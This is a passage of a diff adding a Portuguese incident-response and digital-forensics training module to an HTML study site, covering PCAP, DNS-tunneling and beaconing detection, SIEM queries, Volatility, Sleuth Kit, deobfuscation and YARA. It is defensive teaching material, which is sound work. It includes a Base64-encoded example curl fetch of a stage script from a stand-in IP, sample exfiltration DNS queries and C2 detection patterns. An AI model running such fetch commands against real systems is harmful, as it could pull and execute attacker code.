+  <div class="v" data-cat="pcap">
+    <div class="top"><div class="ttl"><h3><span class="os net">PCAP</span>Reconstrução de Fluxo HTTP e extração de arquivos transferidos</h3><div class="cat">Follow HTTP Stream · Export Objects → calcular hash SHA-256</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div>
+        <p>Em tráfego não cifrado (HTTP, FTP, SMB legado), é possível reconstruir exatamente os comandos enviados a uma webshell e <b>extrair o arquivo binário ou documento exfiltrado</b> diretamente do PCAP para calcular seu hash SHA-256 (questão clássica de provas práticas!).</p></div>
+      <div class="blk"><div class="h find"><span class="d"></span>Como investigar</div>
+<pre><span class="c"># Listar todas as URLs e métodos HTTP da captura:</span>
+<span class="k">tshark</span> -r captura.pcap -Y "http.request" -T fields -e frame.time -e ip.src -e http.request.method -e http.request.full_uri
+
+<span class="c"># Exportar todos os objetos HTTP via linha de comando para uma pasta e tirar o hash:</span>
+<span class="k">tshark</span> -r captura.pcap --export-objects http,./objetos_extraidos/
+<span class="k">sha256sum</span> ./objetos_extraidos/*
+<span class="c"># (No Wireshark gráfico: File &gt; Export Objects &gt; HTTP)</span></pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r safe"><span class="lab">🟢 Estado normal</span>Objetos estáticos legítimos da página (CSS, imagens, páginas públicas).</div>
+        <div class="r vuln"><span class="lab">🔴 Indicador de invasão</span>Download de script/binário de segundo estágio ou upload de arquivo confidencial compactado.</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-net-http" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+
+  <!-- 4 DNS Tunneling -->
+  <div class="v" data-cat="dns">
+    <div class="top"><div class="ttl"><h3><span class="os net">DNS / EXFIL</span>Investigação de DNS: domínios de C2 e DNS Tunneling</h3><div class="cat">detectar dados exfiltrados escondidos em subdomínios Hex / Base64</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / como funciona</div>
+        <p>Como muitos firewalls bloqueiam portas diretas mas deixam consultas DNS (UDP 53) passarem, invasores quebram um arquivo roubado em pedaços codificados (Hex ou Base64) e fazem consultas do tipo <code>436f6e666964656e6369616c.c2-evil.net</code>. O servidor DNS autoritativo do atacante recebe as consultas e remonta o arquivo!</p></div>
+      <div class="blk"><div class="h find"><span class="d"></span>Como investigar</div>
+<pre><span class="c"># Extrair todas as consultas DNS do PCAP para encontrar domínios anômalos ou subdomínios longos:</span>
+<span class="k">tshark</span> -r captura.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | <span class="k">sort</span> -u
+
+<span class="c"># Reconstruir dados em Hex extraídos dos subdomínios (sem duplicatas):</span>
+<span class="k">tshark</span> -r captura.pcap -Y "dns.flags.response==0 &amp;&amp; dns.qry.name contains c2-evil.net" -T fields -e dns.qry.name |
+  <span class="k">cut</span> -d. -f1 | <span class="k">tr</span> -d '\n' | <span class="k">xxd</span> -r -p</pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r safe"><span class="lab">🟢 Estado normal</span>Consultas curtas e legíveis para domínios corporativos e CDNs conhecidas.</div>
+        <div class="r vuln"><span class="lab">🔴 Indicador de invasão</span>Centenas de consultas sequenciais <code>TXT/A</code> com subdomínios longos em Hex/Base64 para um mesmo domínio externo.</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-net-dns" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+
+  <!-- 5 Beaconing & Suricata -->
+  <div class="v" data-cat="dns">
+    <div class="top"><div class="ttl"><h3><span class="os net">C2 / IDS</span>Detecção de Beaconing C2, Exfiltração e alertas Suricata (eve.json)</h3><div class="cat">intervalos regulares · bytes_out alto · correlação com IDS</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div>
+        <p>Mesmo quando o C2 usa HTTPS (conteúdo cifrado), os <b>metadados</b> entregam o ataque: certificado TLS autoassinado/recente, SNI suspeito, conexões em intervalo fixo (ex.: a cada 30s durante horas — <i>beaconing</i>) ou megabytes enviados para fora (<code>bytes_toserver</code> muito maior que o normal). Cruze sempre com <code>/var/log/suricata/eve.json</code>.</p></div>
+      <div class="blk"><div class="h find"><span class="d"></span>Como investigar</div>
+<pre><span class="c"># Filtrar alertas de alta severidade no eve.json do Suricata com jq:</span>
+<span class="k">jq</span> 'select(.event_type=="alert") | {time:.timestamp, src:.src_ip, dst:.dest_ip, sig:.alert.signature}' /var/log/suricata/eve.json
+
+<span class="c"># Listar SNI (nomes de domínio em conexões HTTPS) em um PCAP:</span>
+<span class="k">tshark</span> -r captura.pcap -Y "tls.handshake.extensions_server_name" -T fields -e ip.src -e tls.handshake.extensions_server_name | <span class="k">sort</span> -u</pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r safe"><span class="lab">🟢 Estado normal</span>Servidores internos fazem muito mais download (updates) ou resposta a clientes do que upload espontâneo externo.</div>
+        <div class="r vuln"><span class="lab">🔴 Indicador de invasão</span>Servidor de banco/arquivos abrindo conexões periódicas HTTPS para domínio recém-registrado e enviando 250 MB.</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-net-beacon" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+
+  <!-- 6 Firewall Logs -->
+  <div class="v" data-cat="pcap">
+    <div class="top"><div class="ttl"><h3><span class="os net">PERÍMETRO</span>Correlação de logs de Firewall e Proxy</h3><div class="cat">diferenciar tentativa bloqueada (ruído externo) de conexão aceita (incidente!)</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div>
+        <p>Todo firewall conectado à internet recebe milhares de tentativas bloqueadas por minuto. Na investigação, o ponto crítico é cruzar: <b>1)</b> qual tráfego externo foi <code>ALLOW/PASS</code> para dentro e <b>2)</b> se algum servidor interno iniciou conexão de <b>saída</b> (<i>egress</i>) para o IP atacante — isso confirma execução de código!</p></div>
+      <div class="blk"><div class="h find"><span class="d"></span>Como investigar</div>
+<pre><span class="c"># Filtrar conexões PERMITIDAS envolvendo um IP suspeito ou saídas da DMZ:</span>
+<span class="k">grep</span> "198.51.100.44" /var/log/firewall.log | <span class="k">grep</span> -i "pass\|accept"</pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r safe"><span class="lab">🟢 Ruído bloqueado</span>Pacotes externos barrados (<code>BLOCK/DROP</code>) na WAN sem nenhuma resposta do host interno.</div>
+        <div class="r vuln"><span class="lab">🔴 Comprometimento ativo</span>Conexão <code>PASS</code> de saída do servidor interno para a porta <code>4444</code> do IP externo (shell reverso!).</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-net-ids" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+
+  <!-- 7 SIEM Queries (Splunk SPL & Kibana KQL) -->
+  <div class="v" data-cat="siem">
+    <div class="top"><div class="ttl"><h3><span class="os log">SIEM</span>Consultas de Threat Hunting no SIEM (Splunk SPL e Elastic/Kibana KQL)</h3><div class="cat">filtrar milhões de eventos em segundos · pivô por IP, usuário e processo</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div>
+        <p>Em SOCs e competições modernas, os logs de todas as máquinas já estão indexados em um <b>SIEM</b> (Splunk ou Elastic/Kibana). Saber escrever consultas em <b>SPL (Splunk)</b> e <b>KQL (Kibana)</b> permite correlacionar em segundos onde um invasor logou, quais processos disparou e para quais outros hosts se moveu lateralmente.</p></div>
+      <div class="blk"><div class="h find"><span class="d"></span>Consultas essenciais</div>
+<pre><span class="c"># Splunk (SPL) — achar força bruta seguida de sucesso ou processos filhos de servidor web:</span>
+index=win_sec EventCode=4625 | stats count by src_ip Account_Name | where count &gt; 10 | sort - count
+index=sysmon EventCode=1 ParentImage="*\\w3wp.exe" | table _time host User Image CommandLine
+
+<span class="c"># Elastic / Kibana (KQL) — caçar PowerShell codificado ou conexões para IP de C2:</span>
+event.code : "4688" and process.command_line : (*-enc* or *DownloadString*)
+destination.ip : "198.51.100.44" or dns.question.name : "*.c2-evil.net"</pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r safe"><span class="lab">🟢 Consulta limpa</span>Zero processos de shell filhos de processos web (<code>w3wp.exe</code>, <code>httpd</code>, <code>nginx</code>, <code>tomcat</code>).</div>
+        <div class="r vuln"><span class="lab">🔴 Achado crítico no SIEM</span><code>ParentImage=w3wp.exe</code> executando <code>whoami</code>, <code>net user</code> e PowerShell em múltiplos servidores.</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-net-siem" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+
+  <!-- 8 Phishing & Email Forensics -->
+  <div class="v" data-cat="phish">
+    <div class="top"><div class="ttl"><h3><span class="os log">PHISHING</span>Análise forense de e-mail malicioso (Cabeçalhos, SPF/DKIM/DMARC e Anexos)</h3><div class="cat">identificar spoofing · extrair IP real de envio, URLs e hash do anexo</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / como analisar</div>
+        <p>O phishing é um dos principais vetores de acesso inicial (MITRE <code>T1566</code>). O campo <code>From:</code> exibido ao usuário é facilmente falsificado! Para descobrir a origem real, leia os cabeçalhos <code>Received:</code> <b>de baixo para cima</b>, compare <code>From</code> vs. <code>Return-Path</code> / <code>Reply-To</code>, cheque <code>Authentication-Results</code> (<code>spf=fail</code>, <code>dkim=fail</code>, <code>dmarc=fail</code>) e extraia URLs e o SHA-256 de anexos sem abri-los.</p></div>
+      <div class="blk"><div class="h find"><span class="d"></span>Como investigar</div>
+<pre><span class="c"># Extrair campos críticos de um arquivo .eml bruto com segurança:</span>
+<span class="k">grep</span> -Ei "^(From|Reply-To|Return-Path|Subject|Received|Authentication-Results):" suspeito.eml
+
+<span class="c"># Extrair URLs embutidas no corpo sem clicar:</span>
+<span class="k">grep</span> -Eo 'https?://[^"&gt;\s]+' suspeito.eml | <span class="k">sort</span> -u</pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r safe"><span class="lab">🟢 E-mail autêntico</span><code>spf=pass</code>, <code>dkim=pass</code>, <code>dmarc=pass</code> e links apontando para o domínio legítimo.</div>
+        <div class="r vuln"><span class="lab">🔴 Phishing confirmado</span><code>From: suporte@empresa.com</code>, mas <code>Return-Path: bounce@login-seguro-portal.xyz</code> + <code>spf=fail</code>.</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-net-phish" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+</div>
+
+<!-- ===================== C · MEMÓRIA, DISCO & ARTEFATOS ===================== -->
+<div class="apanel" id="c-forense">
+  <div class="filters" id="cf-for">
+    <span class="pill on" data-f="all">Todos</span>
+    <span class="pill" data-f="pres">Preservação</span>
+    <span class="pill" data-f="mem">Memória (Volatility 3)</span>
+    <span class="pill" data-f="disk">Disco (Sleuth Kit)</span>
+    <span class="pill" data-f="tria">Triagem &amp; YARA</span>
+  </div>
+  <div class="count" id="cc-for"></div>
+
+  <!-- 1 Aquisição e Preservação -->
+  <div class="v" data-cat="pres">
+    <div class="top"><div class="ttl"><h3><span class="os pki">CUSTÓDIA</span>Aquisição bit-a-bit, montagem somente leitura e hash SHA-256</h3><div class="cat">dd / dc3dd · sha256sum · mount -o ro,loop,noexec</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div>
+        <p>Montar uma imagem de disco sem a flag <code>ro</code> (<i>read-only</i>) faz o sistema operacional atualizar metadados de acesso, alterando o hash da evidência e invalidando a prova pericial! Gere o hash antes e depois da cópia e trabalhe exclusivamente sobre cópia ou montagem somente leitura.</p></div>
+      <div class="blk"><div class="h find"><span class="d"></span>Como executar</div>
+<pre><span class="c"># 1) Calcular hash do original, gerar cópia forense e validar que os hashes batem:</span>
+<span class="k">sha256sum</span> evidencia.img &gt; evidencia.sha256
+<span class="k">cp</span> evidencia.img analise_copia.img &amp;&amp; <span class="k">sha256sum</span> -c evidencia.sha256
+
+<span class="c"># 2) Montar partição de imagem SEMPRE em modo somente leitura e sem execução:</span>
+<span class="k">mount</span> -o ro,loop,noexec,nodev analise_copia.img /mnt/forense</pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r vuln"><span class="lab">🔴 Contaminação forense</span>Montar a imagem original em leitura/escrita — o hash SHA-256 muda imediatamente.</div>
+        <div class="r safe"><span class="lab">🟢 Cadeia íntegra</span><code>evidencia.img: OK</code> no <code>sha256sum -c</code> e análise feita em cópia montada com <code>ro,noexec</code>.</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-for-acq" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+
+  <!-- 2 Volatility 3 -->
+  <div class="v" data-cat="mem">
+    <div class="top"><div class="ttl"><h3><span class="os pki">RAM</span>Forense de Memória RAM com Volatility 3 (Windows &amp; Linux)</h3><div class="cat">windows.pstree · windows.cmdline · windows.netscan · windows.malfind</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / sintaxe moderna</div>
+        <p>Malwares <i>fileless</i>, senhas em texto claro, chaves de criptografia e conexões já fechadas residem na <b>memória RAM</b>. Atenção: no <b>Volatility 3</b> não existe mais <code>--profile=...</code> (do antigo Vol 2); os plugins usam prefixo do SO (<code>windows.*</code> ou <code>linux.*</code>). Compare sempre <code>pslist</code> com <code>psscan</code> para achar processos desvinculados (rootkits) e rode <code>malfind</code> para achar injeção de código em memória!</p></div>
+      <div class="blk"><div class="h find"><span class="d"></span>Comandos essenciais (Volatility 3)</div>
+<pre><span class="c"># Identificar build do SO e árvore de processos (pai → filho):</span>
+<span class="k">vol</span> -f memdump.raw windows.info
+<span class="k">vol</span> -f memdump.raw windows.pstree
+
+<span class="c"># Extrair argumentos de linha de comando e conexões de rede ativas/recentes:</span>
+<span class="k">vol</span> -f memdump.raw windows.cmdline
+<span class="k">vol</span> -f memdump.raw windows.netscan
+
+<span class="c"># Detectar código injetado (PAGE_EXECUTE_READWRITE / MZ) e extrair processo suspeito:</span>
+<span class="k">vol</span> -f memdump.raw windows.malfind
+<span class="k">vol</span> -f memdump.raw windows.pslist --pid &lt;PID&gt; --dump
+<span class="c"># (Em dumps Linux com tabela de símbolos ISF: linux.pstree, linux.pslist, linux.malfind)</span></pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r safe"><span class="lab">🟢 Estado normal</span>Hierarquia padrão (ex.: <code>services.exe → svchost.exe</code>, apenas um <code>lsass.exe</code> filho de <code>wininit.exe</code>).</div>
+        <div class="r vuln"><span class="lab">🔴 Indicador na RAM</span><code>explorer.exe → notepad.exe</code> com conexão externa no <code>netscan</code> e região executável acusada no <code>malfind</code>!</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-for-vol" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+
+  <!-- 3 Sleuth Kit / Autopsy -->
+  <div class="v" data-cat="disk">
+    <div class="top"><div class="ttl"><h3><span class="os pki">DISCO</span>Forense de disco e recuperação de arquivos apagados (Sleuth Kit / Autopsy)</h3><div class="cat">mmls (partições) · fls (listar deletados) · icat (extrair por inode)</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / como funciona</div>
+        <p>Quando alguém apaga um arquivo normalmente (<code>rm</code> / Lixeira), o sistema apenas marca o ponteiro (<i>inode</i> ou entrada <i>MFT</i>) como livre — os blocos de dados continuam no disco até serem sobrescritos! O <b>Sleuth Kit</b> (motor de linha de comando por trás do <b>Autopsy</b>) lista arquivos deletados com <code>*</code> e recupera seu conteúdo pelo número do inode.</p></div>
+      <div class="blk"><div class="h find"><span class="d"></span>Como investigar</div>
+<pre><span class="c"># 1) Ver tabela de partições da imagem (anotar o offset inicial da partição):</span>
+<span class="k">mmls</span> disco.img
+
+<span class="c"># 2) Listar arquivos recursivamente, exibindo deletados (marcados com *):</span>
+<span class="k">fls</span> -r -d -o &lt;OFFSET&gt; disco.img
+
+<span class="c"># 3) Extrair o arquivo deletado diretamente pelo número do inode:</span>
+<span class="k">icat</span> -o &lt;OFFSET&gt; disco.img &lt;INODE&gt; &gt; recuperado.bin &amp;&amp; <span class="k">sha256sum</span> recuperado.bin</pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r safe"><span class="lab">🟢 Sem artefato oculto</span>Apenas arquivos temporários normais do sistema entre os inodes liberados.</div>
+        <div class="r vuln"><span class="lab">🔴 Evidência recuperada</span><code>r/r * 1842: segredos_clientes.zip</code> ou script de exfiltração apagado mas íntegro via <code>icat</code>!</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-for-tsk" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+
+  <!-- 4 Triagem estática -->
+  <div class="v" data-cat="tria">
+    <div class="top"><div class="ttl"><h3><span class="os pki">TRIAGEM</span>Análise estática segura de artefatos (file, strings, exiftool e sha256sum)</h3><div class="cat">nunca execute um binário suspeito na sua máquina — inspecione estaticamente!</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div>
+        <p>Atacantes renomeiam executáveis para parecerem inofensivos (ex.: <code>fatura.pdf</code> que na verdade é um binário ELF ou PE Windows). Com <code>file</code> (lê os <i>magic bytes</i> reais), <code>strings</code> (extrai URLs, IPs, chaves e comandos legíveis) e <code>exiftool</code> (autor, software gerador, GPS), você extrai IOCs valiosos com risco zero de infecção.</p></div>
+      <div class="blk"><div class="h find"><span class="d"></span>Como investigar</div>
+<pre><span class="k">file</span> fatura.pdf                           <span class="c"># revela o formato real pelos magic bytes (ELF, PE32, PDF...)</span>
+<span class="k">sha256sum</span> fatura.pdf                      <span class="c"># gera o IOC de hash para busca em Threat Intel</span>
+<span class="k">strings</span> -n 6 fatura.pdf | <span class="k">grep</span> -Ei "http|([0-9]{1,3}\.){3}[0-9]{1,3}|/bin/|cmd\.exe"
+<span class="k">exiftool</span> documento.docx                   <span class="c"># metadados de autoria e datas internas</span></pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r safe"><span class="lab">🟢 Arquivo genuíno</span><code>fatura.pdf: PDF document, version 1.7</code> sem URLs ou binários embutidos.</div>
+        <div class="r vuln"><span class="lab">🔴 Artefato camuflado</span><code>fatura.pdf: ELF 64-bit LSB executable</code> contendo string <code>http://198.51.100.44:8080/stage2</code>!</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-for-stat" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+
+  <!-- 5 Desofuscação defensiva -->
+  <div class="v" data-cat="tria">
+    <div class="top"><div class="ttl"><h3><span class="os pki">DECODE</span>Desofuscação segura de scripts e indicadores (Base64, Hex e URL)</h3><div class="cat">revelar C2 e persistência escondidos sem acionar bash / eval / Invoke-Expression</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / regra de segurança</div>
+        <p>Muitos scripts encontrados em cron jobs, logs web ou eventos PowerShell vêm codificados em Base64, Hex ou URL-encoding para enganar filtros simples. Decodifique sempre canalizando a saída para <b>visualização pura no terminal</b> (ou no <i>CyberChef</i>) — <b>jamais</b> redirecione a saída decodificada para <code>bash</code>, <code>sh</code> ou <code>iex</code>!</p></div>
+      <div class="blk"><div class="h find"><span class="d"></span>Como decodificar com segurança</div>
+<pre><span class="c"># Decodificar Base64 exibindo apenas como texto:</span>
+<span class="k">echo</span> "Y3VybCBodHRwOi8vMTk4LjUxLjEwMC40NC9iZWFjb24uc2g=" | <span class="k">base64</span> -d; <span class="k">echo</span>
+
+<span class="c"># Decodificar string Hexadecimal:</span>
+<span class="k">echo</span> "3139382e35312e3130302e3434" | <span class="k">xxd</span> -r -p; <span class="k">echo</span>
+
+<span class="c"># Decodificar URL encoding (%2F, %3B, %20) com Python:</span>
+<span class="k">python3</span> -c "import urllib.parse,sys; print(urllib.parse.unquote(sys.argv[1]))" "%2Fetc%2Fpasswd"</pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r vuln"><span class="lab">🔴 Risco grave</span>Executar o script "para ver o que ele faz" — aciona o malware ou destrói o ambiente.</div>
+        <div class="r safe"><span class="lab">🟢 Análise segura</span>String decodificada apenas na tela, revelando o domínio/IP de C2 para bloqueio imediato.</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-for-deobf" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+
+  <!-- 6 YARA & Sigma -->
+  <div class="v" data-cat="tria">
+    <div class="top"><div class="ttl"><h3><span class="os pki">HUNTING</span>Varredura de artefatos com YARA e detecção em logs com Sigma</h3><div class="cat">transformar os IOCs descobertos em busca ativa em toda a rede</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div>
+        <p>Achou uma webshell ou backdoor em <i>um</i> servidor? O próximo passo do especialista é criar uma regra <b>YARA</b> rápida com as strings exclusivas daquele artefato e varrer os diretórios de todos os outros servidores para garantir que não restou nenhuma cópia escondida com outro nome!</p></div>
+      <div class="blk"><div class="h find"><span class="d"></span>Exemplo prático de regra YARA</div>
+<pre><span class="c"># regra_webshell.yar:</span>
+rule Detect_Custom_Artifact {
+    strings:
+        $s1 = "X-Auth-Backdoor" ascii
+        $s2 = "c2-evil.net" ascii
+    condition:
+        any of them
+}
+
+<span class="c"># Varrer recursivamente /var/www e /tmp procurando correspondências:</span>
+<span class="k">yara</span> -r regra_webshell.yar /var/www /tmp</pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r safe"><span class="lab">🟢 Varredura limpa</span>Nenhuma correspondência encontrada após a erradicação.</div>
+        <div class="r vuln"><span class="lab">🔴 Persistência secundária achada</span><code>Detect_Custom_Artifact /var/www/html/css/.cache.php</code> — segunda cópia oculta localizada!</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-for-yara" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+</div>
+
+<!-- ===================== C · FERRAMENTAS & CHECKLIST ===================== -->
+<div class="apanel" id="c-tools">
+  <div class="disc" style="margin-top:4px">🧰 Arsenal essencial de um analista de <b>DFIR &amp; SOC</b>. ⚠️ <b>Regra de ouro de OPSEC:</b> ao investigar um incidente real, consulte no VirusTotal apenas o <b>hash SHA-256</b> — nunca faça upload de arquivos que possam conter dados internos ou segredos do cliente!</div>
+
+  <div class="tgroup">
+    <h4><span class="d"></span>SIEM, Logs &amp; Threat Hunting</h4>
+    <div class="tgrid two">
+      <div class="tool"><div class="tn"><a href="https://www.elastic.co/security" target="_blank" rel="noopener">Elastic Security (Kibana)</a><div class="dsc">Plataforma SIEM/EDR muito usada em competições e SOCs com busca rápida em KQL e timelines.</div></div><span class="badge">SIEM</span></div>
+      <div class="tool"><div class="tn"><a href="https://wazuh.com/" target="_blank" rel="noopener">Wazuh</a><div class="dsc">SIEM + XDR open-source com monitoramento de integridade de arquivos (FIM) e resposta ativa.</div></div><span class="badge">SIEM/XDR</span></div>
+      <div class="tool"><div class="tn"><a href="https://github.com/WithSecureLabs/chainsaw" target="_blank" rel="noopener">Chainsaw / Hayabusa</a><div class="dsc">Triagem ultrarrápida de arquivos Windows Event Logs (.evtx) aplicando regras Sigma direto no terminal.</div></div><span class="badge">EVTX</span></div>
+      <div class="tool"><div class="tn"><a href="https://github.com/SigmaHQ/sigma" target="_blank" rel="noopener">SigmaHQ</a><div class="dsc">Repositório aberto com milhares de regras de detecção prontas para Windows, Linux, Web e Cloud.</div></div><span class="badge">Regras</span></div>
+    </div>
+  </div>
+
+  <div class="tgroup">
+    <h4><span class="d"></span>Forense de Rede &amp; PCAP</h4>
+    <div class="tgrid two">
+      <div class="tool"><div class="tn"><a href="https://www.wireshark.org/" target="_blank" rel="noopener">Wireshark &amp; tshark</a><div class="dsc">Padrão absoluto para inspeção profunda de pacotes, reconstrução de streams e extração de objetos.</div></div><span class="badge">PCAP</span></div>
+      <div class="tool"><div class="tn"><a href="https://zeek.org/" target="_blank" rel="noopener">Zeek</a><div class="dsc">Transforma capturas de rede em logs estruturados ricos (conn.log, dns.log, http.log, ssl.log).</div></div><span class="badge">NDR</span></div>
+    </div>
+  </div>
+
+  <div class="tgroup">
+    <h4><span class="d"></span>Forense de Memória, Disco &amp; Triagem</h4>
+    <div class="tgrid two">
+      <div class="tool"><div class="tn"><a href="https://github.com/volatilityfoundation/volatility3" target="_blank" rel="noopener">Volatility 3</a><div class="dsc">Framework referência mundial para análise forense de dumps de memória RAM Windows e Linux.</div></div><span class="badge">RAM</span></div>
+      <div class="tool"><div class="tn"><a href="https://www.sleuthkit.org/autopsy/" target="_blank" rel="noopener">Autopsy &amp; Sleuth Kit</a><div class="dsc">Análise forense completa de imagens de disco, recuperação de arquivos deletados e super-timeline.</div></div><span class="badge">Disco</span></div>
+      <div class="tool"><div class="tn"><a href="https://ericzimmerman.github.io/" target="_blank" rel="noopener">Eric Zimmerman's Tools</a><div class="dsc">Conjunto consagrado para analisar Registry, MFT, Prefetch, Amcache, LNK e Event Logs no Windows.</div></div><span class="badge">Windows</span></div>
+      <div class="tool"><div class="tn"><a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">CyberChef</a><div class="dsc">"Canivete suíço cibernético" no navegador para decodificar Base64, Hex, XOR, Gzip, timestamps e URLs com segurança.</div></div><span class="badge">Decode</span></div>
+    </div>
+  </div>
+
+  <div class="mgroup" style="margin-top:28px"><span class="d"></span>Checklist interativo — Condução de Resposta a Incidentes (<span id="cChkCount">0/8</span>)</div>
+  <p style="color:var(--mut);font-size:13.5px;margin:0 0 8px">Siga este roteiro operacional em qualquer investigação ou prova prática de DFIR:</p>
+  <div class="chklist" id="cChkList">
+    <label class="chkitem"><input type="checkbox" data-cchk="ir1"><div><b>1. Evidências voláteis preservadas primeiro</b><div class="cd">Horário UTC anotado, conexões ativas, processos em memória e hashes SHA-256 registrados antes de qualquer alteração.</div></div></label>
+    <label class="chkitem"><input type="checkbox" data-cchk="ir2"><div><b>2. Vetor de acesso inicial e Paciente Zero identificados</b><div class="cd">Confirmado como e quando o invasor entrou (IP de origem, conta/serviço explorado e timestamp inicial em UTC).</div></div></label>
+    <label class="chkitem"><input type="checkbox" data-cchk="ir3"><div><b>3. Escopo completo e movimentação lateral mapeados</b><div class="cd">Verificado quais contas, servidores, bancos ou arquivos foram acessados a partir do ponto inicial.</div></div></label>
+    <label class="chkitem"><input type="checkbox" data-cchk="ir4"><div><b>4. Todos os mecanismos de persistência localizados</b><div class="cd">Conferidos cron jobs, chaves SSH, serviços systemd/Windows, chaves Run, tarefas agendadas, contas novas e webshells.</div></div></label>
+    <label class="chkitem"><input type="checkbox" data-cchk="ir5"><div><b>5. Exfiltração e C2 analisados na rede/logs</b><div class="cd">Identificados IPs/domínios de C2, beaconing, DNS tunneling ou volume de dados extraídos.</div></div></label>
+    <label class="chkitem"><input type="checkbox" data-cchk="ir6"><div><b>6. Contenção aplicada sem derrubar serviços legítimos</b><div class="cd">IPs/domínios maliciosos bloqueados no firewall, contas comprometidas suspensas/rotacionadas e sessões encerradas.</div></div></label>
+    <label class="chkitem"><input type="checkbox" data-cchk="ir7"><div><b>7. Erradicação e correção da causa-raiz validadas</b><div class="cd">Artefatos maliciosos removidos e a vulnerabilidade explorada na entrada devidamente corrigida.</div></div></label>
+    <label class="chkitem"><input type="checkbox" data-cchk="ir8"><div><b>8. Relatório IR completo entregue (Timeline UTC + ATT&amp;CK + IOCs)</b><div class="cd">Sumário executivo claro, linha do tempo cronológica em UTC, tabela de IOCs e recomendações preventivas.</div></div></label>
+  </div>
+</div>
+
+<!-- ===================== C · PROVAS SIMULADAS ===================== -->
+<div class="apanel" id="c-provas">
+  <div class="disc" style="margin-top:4px;border-color:var(--info)">📝 <b>Arena de Provas Simuladas — Incident Response &amp; Forense Digital:</b> escolha um dos <b>3 incidentes completos</b> abaixo para investigar 100% dentro da plataforma. Analise o <b>Terminal Forense</b>, os <b>Logs/SIEM</b> e a <b>Captura de Rede (PCAP) / Artefatos</b>, responda manualmente às questões de investigação (IOCs, persistência e contenção), monte a linha do tempo e valide seu relatório!</div>
+  <div class="exgrid" id="exCGrid"></div>
+  <div class="exarena" id="exCArena"></div>
+</div>
+
+</div><!-- /.wrap -->
+</div><!-- /#provaC -->
 <div class="prova-content" id="provaD">
   <div class="provaempty"><div class="big">🅳</div><h2>Prova D</h2><p>Conteúdo em construção.</p><span class="tag">em breve</span></div>
 </div>
@@ -3138,6 +4098,10 @@ local stratum 10                  <span class="c"># fallback local se perder int
   setupFilters('a-svc','af-svc','ac-svc','controle exibido','controles exibidos');
   setupFilters('a-net','af-net','ac-net','controle exibido','controles exibidos');
   setupFilters('a-logs','af-logs','ac-logs','controle exibido','controles exibidos');
+  setupFilters('c-linux','cf-linux','cc-linux','técnica exibida','técnicas exibidas');
+  setupFilters('c-win','cf-win','cc-win','técnica exibida','técnicas exibidas');
+  setupFilters('c-net','cf-net','cc-net','técnica exibida','técnicas exibidas');
+  setupFilters('c-forense','cf-for','cc-for','técnica exibida','técnicas exibidas');
 
   // concept modal (Prova B + Prova A)
   (function(){
@@ -4593,6 +5557,685 @@ document.querySelectorAll('#provaA .jumpcard').forEach(function(j){
         save(); renderGrid();
         fb.innerHTML='<div style="font-weight:700;margin-bottom:8px;color:'+(passed?'var(--acc)':'var(--acc2)')+'">'
           +(passed?'🏆 Relatório Completo Aprovado (4/4 achados corretos + Sumário Executivo)!':'🔎 Resultado da avaliação: '+matched+' / 4 achados totalmente corretos')
+          +'</div>'+details.join("");
+        fb.classList.add("show");
+      };
+    }
+
+    renderGrid(); renderArena();
+  })();
+})();
+</script>
+<script>
